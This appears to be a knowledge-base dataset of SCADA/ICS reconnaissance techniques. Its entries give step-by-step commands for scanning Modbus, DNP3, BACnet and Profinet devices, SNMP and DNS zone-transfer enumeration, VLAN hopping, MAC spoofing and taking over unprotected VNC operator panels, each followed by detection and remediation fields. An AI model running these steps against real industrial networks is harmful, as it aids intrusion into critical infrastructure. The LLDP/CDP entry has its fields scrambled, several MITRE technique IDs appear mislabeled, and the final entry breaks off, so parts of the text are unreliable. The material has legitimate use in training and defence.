# SCADA/ICS Attacks

## Mapping ICS Network with Passive Sniffing

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Network
- **Vulnerability**: Lack of network segmentation
- **MITRE**: T1595.002 (Passive Scanning)
- **Impact**: Attacker gains understanding of ICS architecture without being detected
- **Tools**: Wireshark, tcpdump
- **Scenario**: An attacker passively listens to ICS traffic to map network devices without active probing.
- **Attack Steps**: Step 1: Connect a laptop to a mirrored port on the ICS switch (or a tap port).Step 2: Launch Wireshark or tcpdump to monitor traffic without sending any packets.Step 3: Identify device IPs and communication protocols (Modbus, DNP3, etc.).Step 4: Track repeated traffic patterns to distinguish between PLCs, HMIs, and sensors.Step 5: Record all observed IPs, ports, and communication roles into a network map.
- **Detection**: Monitor mirrored ports and deploy passive anomaly detection systems
- **Solution**: Segment ICS networks and restrict access to mirrored ports
- **Tags**: ICS, Passive Recon, Wireshark

## Active Port Scan on Modbus Devices

- **Attack Type**: Port Scanning
- **Target**: PLCs / Modbus devices
- **Vulnerability**: No firewall/filtering of ICS ports
- **MITRE**: T1046 (Network Service Scanning)
- **Impact**: Reveals vulnerable ICS services and devices
- **Tools**: Nmap
- **Scenario**: Attacker scans for open ports to discover Modbus-enabled PLCs and other ICS services.
- **Attack Steps**: Step 1: Attacker connects to the same VLAN as ICS devices or gains access through a compromised engineering workstation.Step 2: Run nmap -sS -p 502 192.168.1.0/24 to find devices running Modbus TCP.Step 3: Identify devices responding on port 502 (standard for Modbus).Step 4: Optionally run version detection using nmap -sV -p 502 [target IP].Step 5: Log each device IP and port status for further exploitation.
- **Detection**: Network IDS alerts for port scan behavior
- **Solution**: Use firewalls to block unused ports, enable DPI for ICS protocols
- **Tags**: Port Scan, Modbus, ICS

## Using Shodan for External SCADA Discovery

- **Attack Type**: Network Reconnaissance
- **Target**: Internet-exposed ICS
- **Vulnerability**: Misconfigured firewalls
- **MITRE**: T1595.001 (Active Scanning - Internet)
- **Impact**: External attackers can identify and exploit ICS devices
- **Tools**: Shodan, Browser
- **Scenario**: An attacker uses public search engines to find Internet-exposed ICS devices.
- **Attack Steps**: Step 1: Go to https://www.shodan.io and create a free account.Step 2: Search for port:502 country:"IN" to find Indian Modbus devices.Step 3: Refine search using ICS-related banners like product:Modbus or title:SCADA.Step 4: Review IP addresses, open ports, and banners of exposed ICS systems.Step 5: Log vulnerable systems for reporting or further analysis.
- **Detection**: Monitor ICS exposure using Shodan monitoring or SIEM
- **Solution**: Never expose ICS devices directly to the internet
- **Tags**: Shodan, SCADA, Recon

## Identifying ICS Protocols with Nmap NSE

- **Attack Type**: Port Scanning
- **Target**: SCADA Devices (Modbus, BACnet)
- **Vulnerability**: ICS services lack authentication
- **MITRE**: T1046, T1595.002
- **Impact**: Gives detailed fingerprint of critical ICS devices
- **Tools**: Nmap, NSE Scripts
- **Scenario**: Attacker uses Nmap scripting engine (NSE) to fingerprint ICS protocols and gather metadata.
- **Attack Steps**: Step 1: Launch terminal and run nmap --script modbus-discover -p 502 [target IP].Step 2: Review device metadata like slave ID, function support, and vendor info.Step 3: For BACnet, use nmap --script bacnet-info -p 47808 [target IP].Step 4: Analyze returned fields for SCADA device type and firmware version.Step 5: Document exposed info for follow-up vulnerabilities.
- **Detection**: Deep packet inspection, script detection logs
- **Solution**: Disable unnecessary protocols or use DPI firewalls
- **Tags**: ICS Protocols, Nmap NSE

## Scanning for DNP3 Devices in Utility Subnet

- **Attack Type**: Port Scanning
- **Target**: Smart Grid / Substation
- **Vulnerability**: Lack of DNP3 filtering
- **MITRE**: T1046 (Network Scan), T1595
- **Impact**: Reveals SCADA device type and vulnerabilities
- **Tools**: Nmap, Wireshark
- **Scenario**: Attacker looks for DNP3 (Distributed Network Protocol) used in substations or smart grids.
- **Attack Steps**: Step 1: Attacker connects to utility subnet using compromised VPN or jump server.Step 2: Run nmap -sS -p 20000 10.10.0.0/24 to detect DNP3 endpoints.Step 3: Capture responses and analyze device fingerprinting with Wireshark.Step 4: Use nmap --script dnp3-info -p 20000 [target IP] for additional protocol metadata.Step 5: Note device IDs, services, and firmware hints for later attacks.
- **Detection**: Monitor port 20000 scanning via firewall logs
- **Solution**: Block DNP3 externally; isolate substations
- **Tags**: Smart Grid, DNP3, ICS Scan

## ARP Scanning to Discover ICS Devices

- **Attack Type**: Network Reconnaissance
- **Target**: PLCs, RTUs, HMIs
- **Vulnerability**: Unsegmented flat networks
- **MITRE**: T1595.002 (Passive Scanning)
- **Impact**: Exposes all connected ICS assets with IP-MAC mapping
- **Tools**: arp-scan, Nmap, Wireshark
- **Scenario**: Attacker uses Address Resolution Protocol (ARP) to discover all active ICS hosts within a subnet.
- **Attack Steps**: Step 1: Connect to the same subnet or VLAN as the ICS environment.Step 2: Launch arp-scan -l to send ARP requests and capture all IP-MAC mappings in the local network.Step 3: Cross-reference MAC address vendor prefixes to identify ICS device manufacturers (e.g., Rockwell, Siemens).Step 4: Document IP addresses and physical hardware identities of PLCs, RTUs, HMIs.Step 5: Save the ARP map for follow-up port or protocol scanning.
- **Detection**: ARP flood alerts, MAC/IP mapping anomalies
- **Solution**: Network segmentation; restrict ARP broadcasts
- **Tags**: ARP Scan, ICS Discovery

## Host Discovery using ICMP Echo Requests

- **Attack Type**: Network Reconnaissance
- **Target**: Any ICS host
- **Vulnerability**: No ICMP filtering
- **MITRE**: T1595.002 (Passive Scanning)
- **Impact**: Identifies all online ICS devices quickly
- **Tools**: Nmap, fping
- **Scenario**: Basic ping sweep is performed to find live ICS devices in a given IP range.
- **Attack Steps**: Step 1: Open a terminal and type fping -a -g 192.168.0.1 192.168.0.254 to send ICMP pings to each address.Step 2: Identify which IPs respond with echo replies (live hosts).Step 3: Record IPs of responsive devices.Step 4: Optionally run nmap -sn 192.168.0.0/24 to automate host discovery.Step 5: Correlate the IPs with later port scans to map ICS roles.
- **Detection**: Monitor ICMP traffic for unusual frequency
- **Solution**: Block ICMP from unauthorized sources
- **Tags**: Ping Sweep, ICS Mapping

## VLAN Hopping to Access ICS Network

- **Attack Type**: Network Reconnaissance
- **Target**: ICS VLAN
- **Vulnerability**: Switch misconfiguration (DTP enabled)
- **MITRE**: T1595, T1046
- **Impact**: Unauthorized access to ICS VLAN
- **Tools**: Yersinia, Scapy
- **Scenario**: Attacker uses switch misconfigurations to jump from IT VLAN into ICS VLAN to initiate scans.
- **Attack Steps**: Step 1: Connect attacker laptop to a switch port configured as dynamic trunking (misconfigured).Step 2: Launch yersinia -G and start a Dynamic Trunking Protocol (DTP) attack.Step 3: Gain trunk access to multiple VLANs including the ICS VLAN.Step 4: Assign ICS VLAN tag to interface using Scapy or VLAN tool.Step 5: Begin scanning ICS subnet using Nmap or Wireshark.
- **Detection**: VLAN ACL logs, MAC spoof detection
- **Solution**: Disable DTP; use static trunking and VLAN ACLs
- **Tags**: VLAN Hop, ICS Pivot

## Scanning Serial-over-IP Gateways

- **Attack Type**: Port Scanning
- **Target**: Serial-IP Gateways
- **Vulnerability**: Default configuration or no auth
- **MITRE**: T1046
- **Impact**: Enables pivoting into serial ICS networks
- **Tools**: Nmap, Wireshark
- **Scenario**: Attacker finds IP-based gateways that bridge serial protocols like Modbus RTU into IP networks.
- **Attack Steps**: Step 1: Scan network using nmap -p 23,80,502,20000,44818 -sV 192.168.1.0/24.Step 2: Identify IP gateways running telnet or web interface (serial/IP bridge).Step 3: Connect to port 23 or port 80 and inspect the banner or login interface.Step 4: Identify what type of serial device is behind the gateway (e.g., Modbus RTU to TCP).Step 5: Document accessible ports and services for potential interaction.
- **Detection**: Monitor unusual telnet/web logins on gateway IPs
- **Solution**: Require strong auth and disable unused ports
- **Tags**: ICS Gateway, Serial

## Discovery via Broadcast Messages

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Broadcast Devices
- **Vulnerability**: Broadcast leakage and no segmentation
- **MITRE**: T1595.002
- **Impact**: Provides attacker passive view of ICS structure
- **Tools**: Wireshark
- **Scenario**: Attacker listens to ICS broadcast or multicast messages to learn about device types and topology.
- **Attack Steps**: Step 1: Connect passively to ICS subnet using a network tap or mirror port.Step 2: Launch Wireshark and filter for broadcast protocols (e.g., BACnet, Ethernet/IP, ProfiNet).Step 3: Observe device announcements, including IP, vendor, and status.Step 4: Analyze repeated broadcast frames to infer device roles and locations.Step 5: Export capture to .pcap for further analysis and mapping.
- **Detection**: Use switches with broadcast storm protection
- **Solution**: Disable broadcast/multicast where not needed
- **Tags**: ICS Protocols, Passive

## Passive DNS Recon in ICS Subnets

- **Attack Type**: Network Reconnaissance
- **Target**: ICS DNS clients
- **Vulnerability**: Internal DNS leakage
- **MITRE**: T1596.002 (DNS Collection)
- **Impact**: Leaks internal naming structure
- **Tools**: Wireshark, tcpdump
- **Scenario**: Attacker collects internal hostname information by sniffing DNS queries on ICS segment.
- **Attack Steps**: Step 1: Connect to internal ICS network or mirrored switch port.Step 2: Open Wireshark and apply filter dns to watch queries and responses.Step 3: Identify internal device hostnames like plc01.scada.local or hmi.prod.local.Step 4: Cross-reference hostnames with observed IP addresses.Step 5: Use this data to prioritize which systems to scan or target.
- **Detection**: Monitor and log DNS queries
- **Solution**: Use split-horizon DNS and limit ICS name resolution
- **Tags**: DNS Recon, ICS Naming

## Banner Grabbing on HMI Web Interfaces

- **Attack Type**: Port Scanning
- **Target**: HMIs, Web-Based PLCs
- **Vulnerability**: Verbose banners and poor config
- **MITRE**: T1046, T1595
- **Impact**: Reveals software type and version
- **Tools**: Netcat, curl, Nmap
- **Scenario**: Attacker probes web servers on ICS devices to extract version and vendor information.
- **Attack Steps**: Step 1: Scan for port 80/443 across the ICS subnet using nmap -p 80,443 10.0.0.0/24.Step 2: For live hosts, use curl -I http://[IP] to fetch headers.Step 3: Inspect "Server", "X-Powered-By", or custom banners (e.g., Rockwell HMI or Siemens WebServer).Step 4: Document web service versions and vendor strings.Step 5: Use info for CVE lookup or social engineering simulation.
- **Detection**: WAF logs, web scan anomaly detection
- **Solution**: Limit HTTP response data; remove banners
- **Tags**: ICS Web, HMI Scan

## OS Detection of ICS Devices via TCP/IP Fingerprinting

- **Attack Type**: Port Scanning
- **Target**: PLCs, RTUs
- **Vulnerability**: No traffic normalization, legacy OS
- **MITRE**: T1046
- **Impact**: Enables targeting of OS-specific exploits
- **Tools**: Nmap
- **Scenario**: Attacker identifies the underlying OS of ICS devices using Nmap fingerprinting.
- **Attack Steps**: Step 1: Run nmap -O 192.168.100.0/24 to enable OS detection.Step 2: Wait for responses that match known OS signatures (Linux, Windows CE, VXWorks).Step 3: Identify PLCs running embedded OS and legacy versions.Step 4: Save OS details with IP for potential exploitation or malware deployment.Step 5: Match OS data with vendor manuals or CVE databases.
- **Detection**: Network anomaly detection; endpoint monitoring
- **Solution**: Disable OS fingerprint responses, update firmware
- **Tags**: ICS OS, TCP/IP Stack

## Mapping ICS Device Roles via Port Combinations

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Hosts
- **Vulnerability**: Lack of port filtering
- **MITRE**: T1046
- **Impact**: Functional network role mapping for attacker
- **Tools**: Nmap, Custom Scripts
- **Scenario**: Attacker deduces device type based on services it exposes.
- **Attack Steps**: Step 1: Scan full TCP port range: nmap -p- -T4 10.10.0.0/24.Step 2: Look for port combinations (e.g., 502+80 = Web-enabled Modbus PLC).Step 3: Match patterns: 44818 = Rockwell, 20000 = DNP3, 2404 = IEC 60870-5-104.Step 4: Group devices by type (e.g., RTU, PLC, HMI) using common service profile.Step 5: Build a network role map based on service combinations.
- **Detection**: Monitor for port scanning across large port ranges
- **Solution**: Enforce port whitelisting, close unused ports
- **Tags**: ICS Roles, Port Profile

## SNMP Enumeration of SCADA Switches

- **Attack Type**: Port Scanning
- **Target**: ICS Switches / Routers
- **Vulnerability**: Default SNMP community strings
- **MITRE**: T1615 (SNMP Query)
- **Impact**: Complete ICS topology can be extracted
- **Tools**: snmpwalk, Nmap
- **Scenario**: Attacker identifies SCADA switches and collects device data via SNMP.
- **Attack Steps**: Step 1: Scan for UDP port 161 using nmap -sU -p 161 192.168.1.0/24.Step 2: Use snmpwalk -v2c -c public [target IP] to retrieve SNMP data.Step 3: Identify switch vendor, model, and interface list.Step 4: Look for routing tables or ARP entries.Step 5: Use SNMP details to build switch maps and locate uplinks to ICS PLCs.
- **Detection**: SNMP traps, network device logs
- **Solution**: Change community strings, use SNMPv3
- **Tags**: SNMP, ICS Infra

## Identifying Open Proxy Services in ICS Zones

- **Attack Type**: Network Reconnaissance
- **Target**: Jump Hosts, Routers
- **Vulnerability**: Open proxy misconfiguration
- **MITRE**: T1090 (Proxy)
- **Impact**: Allows attacker to hide origin or access segmented ICS
- **Tools**: Nmap, ProxyChains
- **Scenario**: Attacker looks for proxy or relay services (e.g., open SOCKS/HTTP) to pivot into isolated ICS segments.
- **Attack Steps**: Step 1: Conduct an initial scan using nmap -p 1080,3128,8080,8888 10.0.0.0/24.Step 2: Use banner grabbing or nmap -sV to identify if open ports are proxies.Step 3: If open, test with ProxyChains by routing a scan or curl command via the proxy IP.Step 4: If ICS response is received through proxy, mark the proxy as an internal pivot point.Step 5: Use proxy to relay future attacks or scans into deeper ICS layers.
- **Detection**: Detect with flow analytics and egress rules
- **Solution**: Block unauthorized outbound proxies
- **Tags**: Proxy, Pivot, ICS Internal

## DHCP Request Sniffing in ICS Segments

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Clients (PLCs/HMIs)
- **Vulnerability**: Cleartext DHCP traffic
- **MITRE**: T1205, T1590.004
- **Impact**: Reveals internal network layout & IP assignment
- **Tools**: Wireshark
- **Scenario**: Attacker listens to DHCP traffic to extract IP ranges, DNS info, and default gateways of ICS networks.
- **Attack Steps**: Step 1: Plug into ICS LAN switch port (lab or simulation).Step 2: Launch Wireshark and apply filter bootp or dhcp.Step 3: Wait for devices (PLCs, HMIs) to request or renew leases.Step 4: Record the assigned IPs, gateways, subnet masks, and DNS servers.Step 5: Use this info to predict address ranges or spoof trusted hosts.
- **Detection**: Detect DHCP lease bursts or rogue DHCP
- **Solution**: Isolate ICS from dynamic addressing zones
- **Tags**: DHCP Recon, ICS Internal Map

## Discovering Wireless ICS Bridges

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Field Wi-Fi
- **Vulnerability**: Weak Wi-Fi encryption
- **MITRE**: T1595, T1590.003
- **Impact**: Reveals location and type of ICS wireless bridges
- **Tools**: Kismet, Wigle, Airodump-ng
- **Scenario**: Attacker identifies wireless field equipment or industrial Wi-Fi bridges in use across ICS.
- **Attack Steps**: Step 1: From nearby physical area, run Kismet or Airodump-ng in monitor mode.Step 2: Identify SSIDs like SCADA-Bridge, Field-AP, or equipment vendor names (e.g., Moxa, Siemens).Step 3: Use MAC address lookup to match to ICS vendors.Step 4: Use directional antenna to triangulate signal source (simulate).Step 5: Note encryption type (WEP/WPA) and channel for later engagement.
- **Detection**: Wi-Fi anomaly detection, rogue SSID alerts
- **Solution**: Use strong encryption, MAC filtering, and shielded RF zones
- **Tags**: ICS Wireless, WiFi, Recon

## Service Enumeration with Masscan

- **Attack Type**: Port Scanning
- **Target**: ICS Services
- **Vulnerability**: Lack of port throttling
- **MITRE**: T1046
- **Impact**: Scans wide range of ICS hosts rapidly
- **Tools**: Masscan
- **Scenario**: Attacker uses high-speed scanner to enumerate all live ICS services rapidly.
- **Attack Steps**: Step 1: Download Masscan and configure it to avoid crashing ICS devices (rate = 100 in config).Step 2: Run masscan 10.1.0.0/16 -p 502,20000,44818 --rate=100.Step 3: Record list of IP:port mappings discovered.Step 4: Validate responsive hosts using follow-up Nmap scans.Step 5: Identify patterns in IPs to infer VLAN or department zones.
- **Detection**: Flow monitoring and rate limiting
- **Solution**: Limit ICMP & TCP SYN floods via ACLs
- **Tags**: Masscan, ICS Recon

## Capturing Network Topology via LLDP/CDP

- **Attack Type**: Network Reconnaissance
- **Target**: 
- **Vulnerability**: cdp`.Step 3: Capture LLDP/CDP packets containing switch name, port ID, software version, and neighbor info.Step 4: Use data to recreate switch hierarchy and interconnections.Step 5: Identify ICS-critical paths and redundancy mechanisms.
- **MITRE**: ICS Switches
- **Impact**: Enabled LLDP/CDP without ACLs
- **Tools**: Wireshark, tcpdump
- **Scenario**: Attacker listens for Layer 2 discovery protocols to map ICS switch infrastructure.
- **Attack Steps**: Step 1: Connect to an ICS switch access port (simulation).Step 2: Run Wireshark and apply filter `lldp
- **Detection**: T1590.002
- **Solution**: Reveals physical and logical layout of ICS switching fabric
- **Tags**: Monitor Layer 2 traffic, disable unused protocols

## Detecting Engineering Workstations by Port Fingerprint

- **Attack Type**: Port Scanning
- **Target**: Engineering PCs
- **Vulnerability**: Same subnet as attackers
- **MITRE**: T1046, T1071
- **Impact**: Attacker can plan takeover of engineering tools
- **Tools**: Nmap, netstat
- **Scenario**: Attacker identifies engineering stations by scanning for tools like Studio 5000, TIA Portal.
- **Attack Steps**: Step 1: Scan subnet for open ports used by engineering tools (e.g., 2222, 44818, 135, 445).Step 2: Filter out generic devices (no SMB or dev ports).Step 3: Look for combinations typical of engineering tools and Windows services.Step 4: Try connecting via SMB and see shared directories (e.g., Siemens, Projects).Step 5: Identify potential workstation for lateral movement.
- **Detection**: Detect SMB scans, shared file access logs
- **Solution**: Isolate engineering workstations from other zones
- **Tags**: Eng Workstation, ICS Admin

## Port Knocking Detection on ICS Jump Servers

- **Attack Type**: Port Scanning
- **Target**: Jump Hosts
- **Vulnerability**: Insecure or guessable knocking
- **MITRE**: T1595, T1571
- **Impact**: Allows hidden port to be revealed
- **Tools**: Knockd, Scapy
- **Scenario**: Attacker discovers jump servers protected via "port knocking" and tries to deduce open sequence.
- **Attack Steps**: Step 1: Scan all ports using nmap -p- to check for zero open ports.Step 2: Look for connection resets without responses.Step 3: Send TCP packets to port sequences like 1234 → 2345 → 3456 using Scapy or knock tool.Step 4: Monitor when a new port becomes visible (e.g., SSH opens).Step 5: If sequence is discovered, mark server as exploitable jump point.
- **Detection**: Log knock sequences, use randomized sequences
- **Solution**: Use 2FA and time-restricted auth instead
- **Tags**: Port Knocking, Jump Server

## MAC Address Discovery and Spoofing

- **Attack Type**: Network Reconnaissance
- **Target**: PLCs / ICS Devices
- **Vulnerability**: No port security on switches
- **MITRE**: T1200 (MAC Spoofing)
- **Impact**: Enables impersonation or bypass of MAC filters
- **Tools**: Wireshark, macchanger
- **Scenario**: Attacker captures MACs of ICS systems and prepares to impersonate a trusted device.
- **Attack Steps**: Step 1: Launch Wireshark and sniff traffic to capture MAC addresses of ICS PLCs.Step 2: Use vendor MAC prefixes to identify device type.Step 3: Run macchanger -m [target MAC] eth0 to spoof that address.Step 4: Test connectivity to switch; see if device bypasses security filters.Step 5: If successful, attacker appears as PLC on the network.
- **Detection**: Enable port security, MAC binding
- **Solution**: Bind MAC to switch port with ACL
- **Tags**: MAC Spoof, ICS Identity

## FTP Server Scanning on Legacy ICS

- **Attack Type**: Port Scanning
- **Target**: Legacy PLCs, Engineering Workstations
- **Vulnerability**: Anonymous FTP access
- **MITRE**: T1071.001, T1005
- **Impact**: Leaks configurations, credentials
- **Tools**: Nmap, FileZilla
- **Scenario**: Attacker scans for old FTP servers used for firmware/config uploads in legacy ICS.
- **Attack Steps**: Step 1: Use nmap -p 21 192.168.0.0/24 --script ftp-anon.Step 2: If anonymous login is allowed, connect via FileZilla or command line FTP.Step 3: List directory contents and look for files like firmware.hex, config.ini, or project.alien.Step 4: Download sample configs and inspect for hardcoded passwords.Step 5: Determine ICS function of the host from directory naming.
- **Detection**: Detect anonymous logins or odd downloads
- **Solution**: Disable FTP or replace with SFTP
- **Tags**: ICS FTP, Config Leak

## HTTP OPTIONS Method Probe on ICS Web Panels

- **Attack Type**: Port Scanning
- **Target**: ICS Web Panels
- **Vulnerability**: Misconfigured web servers
- **MITRE**: T1595, T1190
- **Impact**: Allows unauthorized uploads or file deletion
- **Tools**: curl, Nmap
- **Scenario**: Attacker sends OPTIONS request to web services to see what methods are allowed (GET, POST, PUT, DELETE).
- **Attack Steps**: Step 1: Identify ICS device with HTTP service using nmap -p 80,443 10.10.1.0/24.Step 2: Run curl -X OPTIONS http://[target] -i.Step 3: Observe if insecure methods like PUT or DELETE are enabled.Step 4: If PUT is allowed, try uploading a harmless test file to check write access.Step 5: Log all vulnerable web services for remediation or exploit development.
- **Detection**: Log unusual HTTP methods and use WAF
- **Solution**: Disable unnecessary HTTP verbs
- **Tags**: ICS Web, HTTP Methods

## Discovering HMI Stations via RDP Scan

- **Attack Type**: Port Scanning
- **Target**: HMI Workstations
- **Vulnerability**: Exposed RDP
- **MITRE**: T1046, T1133
- **Impact**: Enables access to operator interface
- **Tools**: Nmap, Rdesktop
- **Scenario**: Attacker identifies Human-Machine Interface (HMI) systems by scanning for Remote Desktop Protocol.
- **Attack Steps**: Step 1: Run nmap -p 3389 10.0.0.0/24 to identify hosts with RDP enabled.Step 2: Use nmap -sV -p 3389 for service version detection.Step 3: Attempt RDP banner capture using rdesktop [IP] or xfreerdp.Step 4: If login window or vendor logo is seen, mark it as a possible HMI.Step 5: Log the IPs of RDP-enabled devices for further access or brute force attempts.
- **Detection**: RDP brute force detection, EDR logs
- **Solution**: Disable RDP or limit to engineering jump servers
- **Tags**: RDP, HMI, ICS Access

## NetBIOS Name Scanning to Identify ICS Roles

- **Attack Type**: Network Reconnaissance
- **Target**: Windows-based ICS Hosts
- **Vulnerability**: NetBIOS enabled by default
- **MITRE**: T1590.002
- **Impact**: Allows identification of function & trust levels
- **Tools**: nbtscan
- **Scenario**: Attacker uses NetBIOS queries to enumerate device names and roles in a Windows-based ICS network.
- **Attack Steps**: Step 1: Run nbtscan 192.168.0.0/24 to identify NetBIOS names and domains.Step 2: Identify hostnames like HMI-PC, PLC01, SCADA-OP, etc.Step 3: Infer system roles based on naming conventions.Step 4: Cross-check NetBIOS names with observed IPs and ports.Step 5: Build a logical map of ICS device purposes.
- **Detection**: Disable NetBIOS over TCP/IP
- **Solution**: Replace with DNS or disable name broadcasting
- **Tags**: NetBIOS Recon, Windows ICS

## Exploiting Open VNC in ICS Monitoring Panels

- **Attack Type**: Port Scanning
- **Target**: ICS HMIs / Panels
- **Vulnerability**: Unprotected VNC access
- **MITRE**: T1021.005 (VNC)
- **Impact**: Complete control of operator screen
- **Tools**: Nmap, VNC Viewer
- **Scenario**: Attacker scans for Virtual Network Computing (VNC) services and probes for unauthenticated access.
- **Attack Steps**: Step 1: Run nmap -p 5900-5910 --script vnc-info 192.168.0.0/24.Step 2: If VNC server is found, attempt connection using VNC Viewer.Step 3: If no password is required, attacker gains full view/control of HMI panel.Step 4: Log keystrokes, screenshots, or operator activity for social engineering.Step 5: Optionally inject test input if permitted by environment.
- **Detection**: Monitor port 5900, alert on unknown clients
- **Solution**: Use password and IP-based access controls
- **Tags**: VNC, HMI, ICS Access

## Windows Service Enumeration on ICS Hosts

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Servers
- **Vulnerability**: Weak SMB permissions
- **MITRE**: T1046, T1003
- **Impact**: Reveals services tied to ICS operations
- **Tools**: Nmap, CrackMapExec
- **Scenario**: Attacker uses SMB or WMI to list running services and infer device purpose.
- **Attack Steps**: Step 1: Use nmap -p 445 --script smb-enum-services [IP].Step 2: If SMB allows null or weak authentication, collect list of running services.Step 3: Look for ICS software (e.g., Siemens, Rockwell, Wonderware) in service names.Step 4: Identify outdated or insecure services for later exploitation.Step 5: Document host, services, and possible role in ICS topology.
- **Detection**: SIEM log for SMB connections
- **Solution**: Harden SMB, disable guest/null logins
- **Tags**: SMB Enum, ICS Services

## UDP Port Scan for ICS Protocols

- **Attack Type**: Port Scanning
- **Target**: ICS Protocol Devices
- **Vulnerability**: Unfiltered UDP traffic
- **MITRE**: T1046
- **Impact**: Identifies ICS functions over UDP
- **Tools**: Nmap
- **Scenario**: Attacker discovers ICS protocols that use UDP like BACnet, IEC-104, and SNMP.
- **Attack Steps**: Step 1: Run nmap -sU -p 47808,161,2404 10.1.0.0/24.Step 2: Wait for slow responses due to UDP scanning delays.Step 3: Identify BACnet responses on 47808 — indicates building automation systems.Step 4: For IEC 60870-5-104 (2404), identify if SCADA master/slave relationship exists.Step 5: Log services and associate with ICS component types.
- **Detection**: Detect UDP flood behavior or scan anomalies
- **Solution**: Filter unused UDP ports, use rate limits
- **Tags**: UDP, ICS Protocols

## Identifying ICS Vendors via TLS Certificates

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Web UI
- **Vulnerability**: Default or exposed TLS certs
- **MITRE**: T1596.002
- **Impact**: Reveals ICS vendor details from certs
- **Tools**: openssl, Nmap
- **Scenario**: Attacker extracts TLS certificate details to fingerprint vendor-specific ICS web interfaces.
- **Attack Steps**: Step 1: Scan HTTPS services using nmap -p 443 --script ssl-cert [IP].Step 2: Review output for Organization, Common Name, or Issuer fields.Step 3: Spot vendors like GE Digital, Siemens, or Honeywell in the certs.Step 4: Use vendor data to plan CVE-specific exploits or social engineering.Step 5: Save cert details and expiration dates for further observation.
- **Detection**: Monitor TLS fingerprint anomalies
- **Solution**: Use internal CA with randomized metadata
- **Tags**: SSL Cert, ICS Vendor

## X11 Port Scan on Engineering Workstations

- **Attack Type**: Port Scanning
- **Target**: Linux HMI / Eng Workstation
- **Vulnerability**: Exposed X11 service
- **MITRE**: T1021.003
- **Impact**: GUI compromise of engineering tools
- **Tools**: Nmap, Xnest
- **Scenario**: Attacker scans for exposed X11 windows services that allow remote GUI access.
- **Attack Steps**: Step 1: Run nmap -p 6000-6010 [subnet] to check for X11 service on Linux HMIs or workstations.Step 2: If port 6000 is open, test connection using Xnest :1 -query [target].Step 3: If server allows, view remote desktop session or keystrokes.Step 4: Identify ICS software GUIs from window titles (e.g., TIA Portal).Step 5: Document host and prepare social engineering scenarios.
- **Detection**: Log X11 access, restrict to local use only
- **Solution**: Disable X11 over TCP
- **Tags**: X11, Linux ICS

## DNS Zone Transfer Attempt in ICS DNS

- **Attack Type**: Network Reconnaissance
- **Target**: Internal DNS
- **Vulnerability**: DNS misconfig, no ACLs
- **MITRE**: T1046, T1016
- **Impact**: Dumps entire ICS hostname-IP mapping
- **Tools**: dig, host
- **Scenario**: Attacker tries zone transfer on internal DNS to dump entire name/IP records of ICS systems.
- **Attack Steps**: Step 1: Identify internal DNS server from DHCP or observed queries.Step 2: Run dig AXFR @dns-server.domain.local domain.local.Step 3: If misconfigured, it returns full list of all A, PTR, and CNAME records.Step 4: Extract device names like scada-master, rtu-02, plc-field.Step 5: Use records to build accurate ICS target list.
- **Detection**: Monitor unauthorized AXFR attempts
- **Solution**: Disable AXFR or restrict via ACL
- **Tags**: DNS, ICS Recon

## Discovering ICS Devices via IPv6 Multicast

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Devices w/ IPv6
- **Vulnerability**: IPv6 enabled by default
- **MITRE**: T1595.002
- **Impact**: Can bypass IPv4 ACLs and expose devices
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker leverages IPv6 multicast to locate ICS hosts configured with IPv6 support.
- **Attack Steps**: Step 1: Connect to ICS LAN segment where IPv6 is enabled.Step 2: Send IPv6 neighbor solicitation to ff02::1 (all nodes).Step 3: Capture responses and extract link-local/IPv6 addresses.Step 4: Map MAC addresses to ICS vendors.Step 5: Use findings to build IPv6 recon list for scanning.
- **Detection**: Monitor IPv6 traffic, disable if unused
- **Solution**: Disable IPv6 unless necessary
- **Tags**: IPv6 Recon, ICS

## Bluetooth ICS Equipment Discovery

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Wireless Sensors
- **Vulnerability**: Weak or no pairing auth
- **MITRE**: T1590.003
- **Impact**: Physical access leads to sensor takeover
- **Tools**: hcitool, Bluetooth scanner
- **Scenario**: Attacker scans for ICS field equipment (flow meters, sensors) using Bluetooth protocols.
- **Attack Steps**: Step 1: Move attacker laptop near suspected field devices.Step 2: Run hcitool scan or use Bluetooth GUI scanner.Step 3: Identify devices with names like Emerson-Meter, RTU-BLE, etc.Step 4: Log MAC addresses and signal strength to locate physical location.Step 5: Check if pairing is allowed or required.Step 6: Document vulnerable devices for follow-up access or impersonation.
- **Detection**: Monitor Bluetooth activity near ICS
- **Solution**: Use BLE security modes and proximity fencing
- **Tags**: BLE, ICS Field, Recon

## NTP Enumeration in ICS Networks

- **Attack Type**: Network Reconnaissance
- **Target**: ICS Servers, Switches
- **Vulnerability**: Open NTP without restriction
- **MITRE**: T1595.002
- **Impact**: Maps time hierarchy and NTP spoofing targets
- **Tools**: Nmap, ntpq
- **Scenario**: Attacker scans for Network Time Protocol (NTP) services used by ICS systems for time sync.
- **Attack Steps**: Step 1: Use Nmap to scan for NTP service with nmap -sU -p 123 10.0.0.0/24.Step 2: Identify IPs with port 123 open.Step 3: Use ntpq tool: ntpq -c readvar [IP] to query time source.Step 4: Look for version, stratum, and mode which can reveal if system is master or client.Step 5: Log all NTP-enabled hosts for network timing map.
- **Detection**: Monitor NTP traffic from unauthorized hosts
- **Solution**: Restrict NTP to known peers
- **Tags**: NTP, ICS Time, Recon

## Profinet Device Discovery using Protocol Tools

- **Attack Type**: Network Reconnaissance
- **Target**: Siemens PLCs
- **Vulnerability**: Unfiltered Profinet traffic
- **MITRE**: T1595, T1046
- **Impact**: Maps all Siemens field devices
- **Tools**: Profinet Discovery Tool, Wireshark
- **Scenario**: Attacker identifies Siemens Profinet devices using Profinet Discovery tools.
- **Attack Steps**: Step 1: Connect attacker laptop to ICS LAN (simulate test setup).Step 2: Use Wireshark with filter pnio to detect Profinet traffic.Step 3: Open Profinet Discovery Tool to scan the network.Step 4: Devices respond with names, MACs, roles, and module types.Step 5: Export list for offline analysis.
- **Detection**: Detect unknown MACs or Profinet floods
- **Solution**: Segment fieldbus traffic from admin LAN
- **Tags**: Siemens, Profinet, Recon

## ICS Port Mirroring Abuse

- **Attack Type**: Network Reconnaissance
